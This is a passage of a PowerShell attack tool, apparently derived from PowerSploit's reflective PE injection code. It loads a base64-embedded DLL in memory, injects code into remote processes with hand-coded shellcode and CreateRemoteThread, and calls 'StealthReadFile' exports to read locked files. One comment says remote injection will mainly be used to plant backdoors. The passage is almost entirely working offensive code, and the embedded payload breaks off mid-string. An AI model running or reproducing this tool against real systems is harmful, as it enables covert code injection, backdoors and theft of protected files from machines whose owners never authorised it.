		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
		
		$ProcId = $null
		$ExeArgs = $null
		$ProcName = $null

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
			
            Write-Verbose "Calling StealthReadFile in DLL"

            #Get some functions from the DLL
		    [IntPtr]$StealthReadFileAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StealthReadFile"
		    if ($StealthReadFileAddr -eq [IntPtr]::Zero)
		    {
			    Throw "Couldn't find address of StealthReadFile."
		    }
		    $StealthReadFileDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt64], [UInt32].MakeByRefType(), [UInt64].MakeByRefType()) ([UInt32])
			$StealthReadFile = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StealthReadFileAddr, $StealthReadFileDelegate)

			[IntPtr]$StealthCloseFileAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StealthCloseFile"
		    if ($StealthCloseFileAddr -eq [IntPtr]::Zero)
		    {
			    Throw "Couldn't find address of StealthCloseFile."
		    }
		    $StealthCloseFileDelegate = Get-DelegateType @([IntPtr]) ([Void])
			$StealthCloseFile = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StealthCloseFileAddr, $StealthCloseFileDelegate)

			[IntPtr]$StealthOpenFileAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StealthOpenFile"
		    if ($StealthOpenFileAddr -eq [IntPtr]::Zero)
		    {
			    Throw "Couldn't find address of StealthOpenFile."
		    }
			
		    $StealthOpenFileDelegate = Get-DelegateType @([String]) ([IntPtr])
			$StealthOpenFile = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StealthOpenFileAddr, $StealthOpenFileDelegate)

			
			if ($RemoteDestination -imatch "^\s*$")
			{
				$RemoteDestination = $null
			}
			
			#Open the file and get a stealth handle
			[IntPtr]$FileHandle = $StealthOpenFile.Invoke($Path)
			if ($FileHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't get a handle for the file"
			}
			
            $StopLoop = $false
			do
			{
				[IntPtr]$BufferPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BufferSize)
				[UInt32]$BytesRead = 0
				[UInt64]$BytesLeft = 0

			    [UInt32]$RetVal = $StealthReadFile.Invoke($FileHandle, $BufferPtr, $BufferSize, $FileOffset, [Ref]$BytesRead, [Ref]$BytesLeft)

				if ($RetVal -ne 0)
				{
					Write-Error "Error reading file. Return code: $RetVal" -ErrorAction Stop
				}
				#If there are still bytes of the file left, and a Path was not specified, throw an error.
				#	This means the user is attempting to stream back a file over PS remoting which is bigger than the max size they specified
				if ($RemoteDestination -eq $null)
				{
					$StopLoop = $true
				}
				
				[Byte[]]$ByteBuffer = New-Object Byte[] $BytesRead
				[System.Runtime.InteropServices.Marshal]::Copy($BufferPtr, $ByteBuffer, 0, $BytesRead)
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BufferPtr)
				
				if ($RemoteDestination -ne $null)
				{
					$FileStream = New-Object System.IO.FileStream $RemoteDestination,([System.IO.FileMode]::Append)
					$FileStream.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
					$FileStream.Write($ByteBuffer, 0, $BytesRead) | Out-Null
					$FileStream.Flush() | Out-Null
					$FileStream.Dispose() | Out-Null
					$FileStream = $null
				}
				
				[UInt64]$FileOffset += $BytesRead
				
				Write-Verbose "Read $BytesRead bytes. $BytesLeft bytes remaining."
			} while (($BytesLeft -gt 0) -and ($StopLoop -eq $false))

			#Close the file
			$StealthCloseFile.Invoke($FileHandle) | Out-Null


			
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"

        #More custom code
        if ($RemoteDestination -eq $null)
        {
            $obj = New-Object PSObject
            $obj | Add-Member -MemberType NoteProperty -Name Bytes -Value $ByteBuffer
            $obj | Add-Member -MemberType NoteProperty -Name BytesLeft -Value $BytesLeft
            $obj | Add-Member -MemberType NoteProperty -Name BytesRead -Value $BytesRead
            return $obj
        }
        else
        {
            return $null
        }
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"

	[String]$PEBytes64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADK92adjpYIzo6WCM6OlgjOf1DGztGWCM5/UMXOhJYIzn9Qx86llgjOh+6bzo2WCM6OlgnO3ZYIzkx6286NlgjOTHrCzo+WCM5MesHOj5YIzkx6xM6PlgjOUmljaI6WCM4AAAAAAAAAAFBFAABkhgYAgY0mUgAAAAAAAAAA8AAiIAsCCwAA+AAAABIBAAAAAACcZgAAABAAAAAAAIABAAAAABAAAAACAAAFAAIAAAAAAAUAAgAAAAAAAFACAAAEAAAAAAAAAgBgAQAAEAAAAAAAABAAAAAAAAAAABAAAAAAAAAQAAAAAAAAAAAAABAAAABwuQEAiQAAAAyyAQAoAAAAACACAOABAAAAAAIARBAAAAAAAAAAAAAAADACAKgIAADAEgEAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOCIAQBwAAAAAAAAAAAAAAAAEAEAMAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAf/cAAAAQAAAA+AAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAAPmpAAAAEAEAAKoAAAD8AAAAAAAAAAAAAAAAAABAAABALmRhdGEAAABAPQAAAMABAAAaAAAApgEAAAAAAAAAAAAAAAAAQAAAwC5wZGF0YQAARBAAAAAAAgAAEgAAAMABAAAAAAAAAAAAAAAAAEAAAEAucnNyYwAAAOABAAAAIAIAAAIAAADSAQAAAAAAAAAAAAAAAABAAABALnJlbG9jAACOFAAAADACAAAWAAAA1AEAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBTSIPsIEiNBesVAQBIi9lIiQH2wgF0BejDTQAASIvDSIPEIFvDzMzMzMzMzMzMzESJAkiJSghIi8LDzMzMzMxAU0iD7DBIiwFJi9hEi8JIjVQkIP9QGEiLSwhIOUgIdQ6LCzkIdQiwAUiDxDBbwzLASIPEMFvDzMzMzMzMzMzMSDtKCHUIRDkCdQOwAcMywMPMzMzMzMzMzMzMzMzMzMxIjQWpcQEAw8zMzMzMzMzMSIlcJAhXSIPsMDPbQYvISIv6iVwkIOgtRAAASMdHGA8AAABIhcBIiV8QSI0Vd3EBAEgPRdCIHzgadA5Ig8v/kEj/w4A8GgB190yLw0iLz+hMAQAASItcJEBIi8dIg8QwX8PMzMzMzMzMzMzMzMzMzEiNBUFxAQDDzMzMzMzMzMxAU0iD7DAzwEiL2olEJCBBg/gBdSpIx0IYDwAAAEiJQhCIAkiNFR5xAQBEjUAVSIvL6OoAAABIi8NIg8QwW8PoPP///0iLw0iDxDBbw8zMzEiNBQlxAQDDzMzMzMzMzMxIiVwkCFdIg+wwM9tBi8hIi/qJXCQg6HVDAABIx0cYDwAAAEiFwEiJXxBIjRWXcAEASA9F0IgfOBp0DkiDy/+QSP/DgDwaAHX3TIvDSIvP6GwAAABIi1wkQEiLx0iDxDBfw8zMzMzMzMzMzMzMzMzMSIlcJAhXSIPsIEGLyEGL+EiL2ujgQgAAiTtIhcBIjQW0xgEAdQdIjQWbxgEASIlDCEiLw0iLXCQwSIPEIF/DzLgBAAAAw8zMzMzMzMzMzMxIiVwkCEiJdCQQV0iD7CBJi/hIi/JIi9lIhdJ0WkiLURhIg/oQcgVIiwHrA0iLwUg78HJDSIP6EHIDSIsJSANLEEg7znYxSIP6EHIFSIsD6wNIi8NIK/BNi8hIi9NMi8ZIi8tIi1wkMEiLdCQ4SIPEIF/pyQAAAEmD+P4Ph6QAAABIi0MYSTvAcyBMi0MQSIvXSIvL6KcCAABIhf90dEiDexgQckNIiwvrQU2FwHXqTIlDEEiD+BByGUiLA0SIAEiLw0iLXCQwSIt0JDhIg8QgX8NIi8PGAwBIi1wkMEiLdCQ4SIPEIF/DSIvLSIX/dAtMi8dIi9boFUQAAEiDexgQSIl7EHIFSIsD6wNIi8PGBDgASIt0JDhIi8NIi1wkMEiDxCBfw0iNDTRvAQDoH0MAAMzMzMzMzMzMzMzMzMzMzEiJXCQISIlsJBBIiXQkGFdIg+wgSIt6EEmL6EiL8kiL2Uk7+A+C2gAAAEkr+Ew7z0kPQvlIO8p1L0qNBAdIOUEQD4LKAAAASIN5GBBIiUEQcgNIiwnGBAgAM9JIi8vozQAAAOmEAAAASIP//g+HrAAAAEiLQRhIO8dzJ0yLQRBIi9foeQEAAEiF/3RgSIN+GBByA0iLNkiDexgQciRIiwvrIkiF/3XlSIl5EEiD+BByCEiLAUCIOOszSIvBxgEA6ytIi8tIhf90DEiNFC5Mi8fo+0IAAEiDexgQSIl7EHIFSIsD6wNIi8PGBDgASItsJDhIi3QkQEiLw0iLXCQwSIPEIF/DSI0N/W0BAOg4QgAAzEiNDfBtAQDoK0IAAMxIjQ37bQEA6OZBAADMzMzMzMxIiVwkCFdIg+wgSIt5EEiL2Ug7+g+CpAAAAEiLx0grwkk7wHc1SIN5GBBIiVEQchVIiwHGBBAASIvBSItcJDBIg8QgX8NIi8HGBBEASIvDSItcJDBIg8QgX8NNhcB0UUiDeRgQcgVIiwHrA0iLwUkr+EiNDBBIi8dIK8J0DEqNFAFMi8DoF0IAAEiDexgQSIl7EHIVSIsDxgQ4AEiLw0iLXCQwSIPEIF/DSIvDxgQ7AEiLw0iLXCQwSIPEIF/DSI0NE20BAOhOQQAAzMzMzMzMTIlEJBhIiVQkEEiJTCQIU1ZXQVZIg+w4SMdEJCD+////SYvwSIvZSIv6SIPPD0iD//52BUiL+us1TItBGEmLyEjR6Ui4q6qqqqqqqqpI9+dI0epIO8p2FkjHx/7///9Ii8dIK8FMO8B3BEqNPAFIjU8BRTP2SIXJdBlIg/n/dw3oL0gAAEyL8EiFwHUG6DpAAACQ6xRIi1wkYEiLdCRwSIt8JGhMi3QkeEiF9nQfSIN7GBByBUiLE+sDSIvTSIX2dAtMi8ZJi87oA0EAAEiDexgQcghIiwvodEcAAMYDAEyJM0iJexhIiXMQSIP/EHIDSYvexgQzAEiDxDhBXl9eW8PMzMzMzMzMzMzMzMzMzMxAU0iD7CBIjQUTbwEASIvZSIkB9sIBdAXoI0cAAEiLw0iDxCBbw8zMzMzMzMzMzMxIjQXpbgEASIkBw8zMzMzMi0FASIXSdAZIiQKLQUDzw0BTSIPsIEyLVCRQSYvYTIvZQccCAAAAAEWFyXQyixKLSUA70XIIM8BIg8QgW8NCjQQKO8F2ByvKQYkK6wNFiQpFiwJJA1M4SIvL6CFAAAC4AQAAAEiDxCBbw8zMzMzMzEiJTCQIU0iD7DBIx0QkIP7///9Ni9BIi9lIjQVQbgEASIkBSIlRCEyJQShJi0AIRA+3SAhmRIlJEEmLQAhEi0AMRIlBFEmLQgiLSBSJSxhJi0IISItIIEiJSyBIjQW+bQEASIkDSI0FNGwBAEiJQzgzwEiJQ1BIiUNISIlDWIlDQEiJUzCLSxToMz8AAEiJQ2hIi8voFwEAAIlDYEiLw0iDxDBbw8zMzMzMzMzMzMzMSIlcJAhXSIPsIIvaSIv56BwAAAD2wwF0CEiLz+i/RQAASIvHSItcJDBIg8QgX8PMSIlcJAhXSIPsIEiNBS9tAQBIi9lIiQFIi0lo6JBFAABIg3tIAHQzZg8fhAAAAAAASItDSEiLCEiJS1hIi0gI6GxFAABIi0tI6GNFAABIi0NYSIlDSEiFwHXWM/9IjQVdawEASIl7UEiJe0hIiXtYiXtASIlDOEg5e0h0Lg8fQABIi0NISIsISIlLWEiLSAjoHEUAAEiLS0joE0UAAEiLQ1hIiUNISIXAddZIiXtQSIl7SEiJe1iJe0BIjQXQbAEASIkDSItcJDBIg8QgX8PMzEiJXCQQSIlsJBhIiXQkIFdBVEFVQVZBV0iD7CBIi0EwRTPkSIvZD7dwIEWL/EWL7EgD8A+2BoTAD4QHAQAAZpAPtvhI/8aLx8HvBIPgD4P4CA+P7gAAAIP/CA+P5QAAAEhj6EiNTCRQSIvWTIvFTIlkJFDo6D0AAEyLdCRQTYX2D4i/AAAASAP1SYvshf90L0SLx0gD/kjHwP/////2R/+ASI1MJFBIi9ZID0XoSIlsJFDoqT0AAEiLbCRQSIv3TAP9D4jiAAAAuSAAAADockQAAEiF7UmLz0iL+EjHwP////9ID0TITIlvEEyJdwhIiQ9NA+5NjUX/TIlHGEiLSzBIi1EYSCtREEw7wndajUgR6C9EAABIhcB0IEiJeAhMiSBIi0tQSIXJdQZIiUNI6wNIiQH/Q0BIiUNQD7YGhMAPhfv+//+4AQAAAEiLXCRYSItsJGBIi3QkaEiDxCBBX0FeQV1BXF/DTDljSHQtDx8ASItDSEiLCEiJS1hIi0gI6FxDAABIi0tI6FNDAABIi0NYSIlDSEiFwHXWTIljUEyJY0hMiWNYRIljQDPA65zMzEiJXCQISIl0JBBXSIPsQEGL+EiL8kiL2UmD+f91J0SLQRQz0kiLzkQPr8fogI0AALgBAAAASItcJFBIi3QkWEiDxEBfw4tBFEiLSSBMjUQkNEkPr8GL0EUzyUiJRCQw/xXz9AAAiUQkaIP4/3UK/xXs9AAAhcB1M0SLQxRIi0sgTI1MJGhED6/HSIvWSMdEJCAAAAAA/xXN9AAAhcB0DItDFA+vxzlEJGh0hUiLXCRQSIt